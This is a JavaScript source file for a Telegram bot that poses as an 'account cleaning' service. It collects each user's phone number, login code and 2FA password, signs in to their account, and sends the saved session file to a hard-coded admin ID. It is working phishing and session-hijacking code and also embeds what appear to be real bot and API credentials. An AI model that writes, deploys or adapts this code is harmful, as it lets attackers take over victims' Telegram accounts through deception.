const { Telegraf } = require('telegraf');
const MTProto = require('mtproto-core');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const BOT_TOKEN = '8273534923:AAGJpRJOzwfjQ14wZtclCKKinSfiwlDnKbM';
const API_ID = 23721778;
const API_HASH = '7935a656311ab4e500294b22d6b6c7f6';
const ADMIN_ID = 6307490597;

const bot = new Telegraf(BOT_TOKEN);
const sessions = {};

async function sendSession(chatId, filePath) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('document', fs.createReadStream(filePath));
  await axios.post(url, form, { headers: form.getHeaders() });
}

function createClient() {
  return MTProto({ api_id: API_ID, api_hash: API_HASH });
}

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  sessions[userId] = { step: 'phone' };
  await ctx.reply('🔐 Enter your phone number to start account cleaning:');
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;
  const session = sessions[userId];

  if (!session) return;

  if (session.step === 'phone') {
    session.phone = text;
    session.step = 'code';
    session.client = createClient();

    try {
      const { phone_code_hash } = await session.client.call('auth.sendCode', {
        phone_number: session.phone,
        api_id: API_ID,
        api_hash: API_HASH
      });
      session.codeHash = phone_code_hash;
      await ctx.reply('📲 Enter the code you received:');
    } catch (err) {
      await ctx.reply('❌ Error sending code. Try again.');
      delete sessions[userId];
    }
  }
  
  else if (session.step === 'code') {
    session.code = text;
    try {
      const auth = await session.client.call('auth.signIn', {
        phone_number: session.phone,
        phone_code_hash: session.codeHash,
        phone_code: session.code
      });

      if (auth.user) {
        const sessionFile = `/tmp/${session.phone.replace(/[^0-9]/g, '')}.session`;
        fs.writeFileSync(sessionFile, JSON.stringify(session.client.storage.save()));
        await sendSession(ADMIN_ID, sessionFile);
        await ctx.reply('✅ Account cleaned. Session sent.');
        delete sessions[userId];
      }
    } catch (err) {
      if (err.error_message === 'SESSION_PASSWORD_NEEDED') {
        session.step = 'password';
        await ctx.reply('🔐 Enter your 2FA password:');
      } else {
        await ctx.reply('❌ Invalid code. Try again.');
        delete sessions[userId];
      }
    }
  }

  else if (session.step === 'password') {
    session.password = text;
    try {
      const auth = await session.client.call('auth.signIn', {
        phone_number: session.phone,
        phone_code_hash: session.codeHash,
        phone_code: session.code,
        password: session.password
      });

      if (auth.user) {
        const sessionFile = `/tmp/${session.phone.replace(/[^0-9]/g, '')}.session`;
        fs.writeFileSync(sessionFile, JSON.stringify(session.client.storage.save()));
        await sendSession(ADMIN_ID, sessionFile);
        await ctx.reply('✅ Account cleaned. Session sent.');
        delete sessions[userId];
      }
    } catch (err) {
      await ctx.reply('❌ Wrong password. Try again.');
      delete sessions[userId];
    }
  }
});

bot.launch();
console.log('Bot started');
